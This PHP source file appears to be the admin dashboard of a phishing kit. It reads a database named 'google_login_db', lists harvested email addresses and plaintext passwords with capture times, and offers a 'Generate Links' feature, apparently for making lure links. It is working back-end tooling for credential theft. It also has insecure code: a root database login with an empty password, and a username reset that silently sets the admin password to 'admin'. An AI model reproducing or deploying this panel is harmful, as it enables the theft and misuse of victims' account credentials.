<?php
// Start session
session_start();

// Check if user is logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header("Location: login.php");
    exit();
}

// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "google_login_db";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Function to load credentials from the database
function loadCredentials($conn) {
    $sql = "SELECT username, password FROM admin_credentials LIMIT 1";
    $result = $conn->query($sql);
    return $result->fetch_assoc();
}

// Function to save credentials to the database
function saveCredentials($conn, $username, $password) {
    $hashed_password = password_hash($password, PASSWORD_DEFAULT);
    $sql = "UPDATE admin_credentials SET username = ?, password = ? WHERE id = 1";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("ss", $username, $hashed_password);
    $stmt->execute();
    $stmt->close();
}

// Handle username reset
if (isset($_POST['action']) && $_POST['action'] === 'reset_username') {
    $new_username = $_POST['new_username'];
    $confirm_username = $_POST['confirm_username'];

    if ($new_username === $confirm_username && !empty($new_username)) {
        $credentials = loadCredentials($conn);
        saveCredentials($conn, $new_username, 'admin'); // Keep the same password
        $_SESSION['username'] = $new_username;
        echo json_encode(['status' => 'success', 'message' => 'Username updated successfully']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Usernames do not match']);
    }
    exit();
}

// Handle password reset
if (isset($_POST['action']) && $_POST['action'] === 'reset_password') {
    $new_password = $_POST['new_password'];
    $confirm_password = $_POST['confirm_password'];

    if ($new_password === $confirm_password && !empty($new_password)) {
        $credentials = loadCredentials($conn);
        saveCredentials($conn, $credentials['username'], $new_password); // Update only password
        echo json_encode(['status' => 'success', 'message' => 'Password updated successfully']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Passwords do not match']);
    }
    exit();
}

// Pagination setup
$results_per_page = 10; // Number of records per page
$page = isset($_GET['page']) ? (int)$_GET['page'] : 1; // Current page number
$offset = ($page - 1) * $results_per_page;

// Search and filter functionality
$search_query = isset($_GET['search']) ? $conn->real_escape_string($_GET['search']) : '';
$from_date = isset($_GET['from_date']) ? $conn->real_escape_string($_GET['from_date']) : '';
$to_date = isset($_GET['to_date']) ? $conn->real_escape_string($_GET['to_date']) : '';

// Build dynamic WHERE clause
$where_clauses = [];
if (!empty($search_query)) {
    $where_clauses[] = "(email LIKE '%$search_query%')";
}
if (!empty($from_date)) {
    $where_clauses[] = "created_date >= '$from_date'";
}
if (!empty($to_date)) {
    $where_clauses[] = "created_date <= '$to_date'";
}
$where_sql = !empty($where_clauses) ? "WHERE " . implode(" AND ", $where_clauses) : "";

// Count total records
$total_records_query = "SELECT COUNT(*) AS count FROM user_credentials $where_sql";
$total_records_result = $conn->query($total_records_query);
$total_records = $total_records_result->fetch_assoc()['count'];

// Calculate total pages
$total_pages = ceil($total_records / $results_per_page);

// Fetch paginated records
$sql = "SELECT email, password, created_date, created_time 
        FROM user_credentials 
        $where_sql
        ORDER BY id DESC 
        LIMIT $offset, $results_per_page";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <link rel="stylesheet" href="assets/fontawesome-pro-6.5.0-web/css/all.css">
    <link rel="stylesheet" href="assets/CSS/index-laptop-view.css">
    <link rel="stylesheet" href="assets/CSS/index-phone-view.css">
    <script>
    function applyFilter() {
        var fromDate = document.getElementById('from-date').value;
        var toDate = document.getElementById('to-date').value;
        var searchQuery = document.querySelector('.searchField input[type="text"]').value;
        
        // Construct URL with filter parameters
        var url = window.location.pathname + 
                  '?from_date=' + encodeURIComponent(fromDate) +
                  '&to_date=' + encodeURIComponent(toDate) +
                  '&search=' + encodeURIComponent(searchQuery);
        
        window.location.href = url;
    }
    </script>
</head>
<body>
    <!-- Section to house the contents of the webpage -->
    <section>
        <!-- Div with a class of topBar that contains all the items at the top of the page -->
        <div class="topBar">
            <!-- Div to house the contents at the top bar left -->
            <div class="topBarText">
                <h1>Records</h1>
                <p>Welcome to the Records page. Here you will find all user records</p>
            </div>
            <!-- To house the settings icon and menu -->
            <div class="settingsIcon" id="settings-icon">
                <i class="fa-solid fa-gear"></i>
                <!-- For the settings pop up menu -->
                <div class="settingsMenu" id="settings-menu">
                    <!-- Top/Header section of the settings Menu -->
                    <div class="settingsHeader">
                        <h2>Settings</h2>
                        <div id="close-btn"><i class="fa-solid fa-xmark-large"></i></div>
                        <div id="back-btn"><i class="fa fa-arrow-left"></i></div>

                    </div>
                    <!-- Body of the settings menu -->
                    <div class="settingsBody">
                        <!-- To change username -->
                        <div class="resetUsername" id="reset-username">
                            <p>Change your username</p>
                            <i class="fa-solid fa-angle-right"></i>
                        </div>

                        <div class="resetUsernamePage" id="reset-usernamePage">
                            <input type="text" placeholder="Enter your username" id="enter-username" 
                            class="enterUsername">
                            <input type="text" placeholder="Confirm your username" id="confirm-username" 
                            class="confirmUsername">
                            <button id="reset-username-btn" class="resetUsernameBtn">Reset</button>
                        </div>
                        <!-- To change password -->
                        <div class="resetPwd" id="reset-pwd">
                            <p>Change your password</p>
                            <i class="fa-solid fa-angle-right"></i>
                        </div>

                        <div class="resetPwdPage" id="reset-pwd-page">
                            <input type="password" placeholder="Enter your password" id="enter-pwd" 
                            class="enterpwd">
                            <input type="password" placeholder="Confirm your password" id="confirm-pwd" 
                            class="confirmPwd">
                            <button id="reset-pwd-btn" class="resetPwdBtn">Reset</button>
                        </div>

                        <div class="generateLinks" id="generate-links">
                            <p>Generate Links</p>
                            <i class="fa-solid fa-angle-right"></i>
                        </div>
                        <!-- Generate Links Page -->
                        <div class="generateLinksPage" id="generate-links-page">
                            <p>Generate Links</p>
                            <div class="generateLinksField" id="generate-links-field">
                                <input type="number" min="1" max="100" id="generate-links-num">
                                <button>Generate</button>
                            </div>
                            <button class="viewLinksHistory" id="view-links-history">View Links</button>
                            <button class="clearLinksHistory" id="clear-link-history">Clear Links</button>
                        </div>

                        <!-- To switch theme -->
                        <div class="theme" id="theme">
                            <p>Switch Theme</p>
                            <!-- For the toggle switch -->
                            <label class="switch">
                                <input type="checkbox">
                                <span class="slider round"></span>
                            </label>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Div to house the search, filter and refresh btn -->
        <div class="hedges">
            <!-- Form for searching and filtering -->
            <form action="" class="searchField" id="search-field">
                <input type="text" placeholder="search" name="search" value="<?php echo htmlspecialchars($search_query); ?>">
                <button class="searchBtn" id="search-btn" onclick="applyFilter()"><i class="fas fa-search"></i></button>
                <div class="filterBtn" id="filter-btn">
                    <i class="fa-solid fa-bars-filter"></i>
                    <span>Filter</span>
                </div>
                <span class="filterPane" id="filter-pane">
                    <span class="fromFilter" id="from-filter">
                        <label for="">FROM:</label>
                        <input type="date" id="from-date" class="fromDate"  name="from_date" value="<?php echo htmlspecialchars($from_date); ?>">
                    </span>
                    <span class="toFilter" id="to-filter">
                        <label for="">TO:</label>
                        <input type="date" id="to-date" class="toDate" name="to_date" value="<?php echo htmlspecialchars($to_date); ?>">
                    </span>
                    <button type="button" id="filter-go" class="filterGo" onclick="applyFilter">GO</button>
                </span>
            </form>
            <!-- Separator line to separate the refresh btn from the form -->
            <span class="tally">|</span>
            <div class="refreshBtn" id="refresh-btn"><i class="fas fa-redo"></i></div>
        </div>
        <!-- Container to house the table and the pagination -->
        <div class="container">
            <table> 
                <thead> 
                    <tr> 
                        <th>Email</th> 
                        <th>Password</th> 
                        <th>Date</th> 
                        <th>Time</th> 
                    </tr> 
                </thead> 
                <tbody id="recordTable"> 
                <?php
                    if ($result->num_rows > 0) {
                        while($row = $result->fetch_assoc()) {
                            echo "<tr>";
                            echo "<td>" . htmlspecialchars($row['email']) . "</td>";
                            echo "<td>" . htmlspecialchars($row['password']) . "</td>";
                            echo "<td>" . htmlspecialchars($row['created_date']) . "</td>";
                            echo "<td>" . htmlspecialchars($row['created_time']) . "</td>";
                            echo "</tr>";
                        }
                    } else {
                        echo "<tr><td colspan='4'>No records found</td></tr>";
                    }
                    ?>
                </tbody>    
            </table>
            <div class="pagination" id="pagination"> 
                <!-- Pagination links will be inserted here dynamically -->
                 <div class="pageCount">
                    <span>Total:</span>
                    <span class="pageNoCount" id="page-no-count"><?php echo $total_records; ?></span>
                 </div>

                 <div class="jumpToPage">
                    <a href="">Go to page:</a>
                    <input type="number" name="" id="jump-page" min="1" max="<?php echo $total_pages; ?>">
                    <button onclick="jumpToPage()">Go</button>
                 </div>
                 
                 <div class="paginationNavMenu">
                    <?php if($page > 1): ?>
                        <a href="?page=<?php echo $page-1; ?>&search=<?php echo urlencode($search_query); ?>&from_date=<?php echo urlencode($from_date); ?>&to_date=<?php echo urlencode($to_date); ?>">
                            <button><i class="fa-solid fa-angle-left"></i></button>
                        </a>
                    <?php endif; ?>

                    <span class="pageNavBtn">
                        <?php
                        // Show page numbers with smart pagination
                        $start = max(1, $page - 2);
                        $end = min($total_pages, $page + 2);
                        
                        for ($i = $start; $i <= $end; $i++) {
                            $active = ($i == $page) ? 'style="font-weight:bold;color:blue;"' : '';
                            echo "<a href='?page=$i&search=" . urlencode($search_query) . "&from_date=" . urlencode($from_date) . "&to_date=" . urlencode($to_date) . "' $active>$i</a>";
                        }
                        ?>
                    </span>
                    
                    <?php if($page < $total_pages): ?>
                        <a href="?page=<?php echo $page+1; ?>&search=<?php echo urlencode($search_query); ?>&from_date=<?php echo urlencode($from_date); ?>&to_date=<?php echo urlencode($to_date); ?>">
                            <button><i class="fa-solid fa- angle-right"></i></button>
                        </a>
                    <?php endif; ?>
                </div>
            </div>  
        </div>
        

    </section>

    <script src="assets/JS/index.js"></script>
    <script>
    // Username reset
document.getElementById('reset-username-btn')?.addEventListener('click', function () {
    var newUsername = document.getElementById('enter-username').value.trim();
    var confirmUsername = document.getElementById('confirm-username').value.trim();

    if (!newUsername || !confirmUsername) {
        alert("Please fill in all fields!");
        return;
    }

    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'action=reset_username&new_username=' + encodeURIComponent(newUsername) +
              '&confirm_username=' + encodeURIComponent(confirmUsername),
    })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                alert(data.message);
                location.reload();
            } else {
                alert(data.message);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while resetting the username.');
        });
});

// Password reset
document.getElementById('reset-pwd-btn')?.addEventListener('click', function () {
    var newPassword = document.getElementById('enter-pwd').value.trim();
    var confirmPassword = document.getElementById('confirm-pwd').value.trim();

    if (!newPassword || !confirmPassword) {
        alert("Please fill in all fields!");
        return;
    }

    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'action=reset_password&new_password=' + encodeURIComponent(newPassword) +
              '&confirm_password=' + encodeURIComponent(confirmPassword),
    })
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                alert(data.message);
                location.reload();
            } else {
                alert(data.message);
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while resetting the password.');
        });
});

</script>
</body>
</html>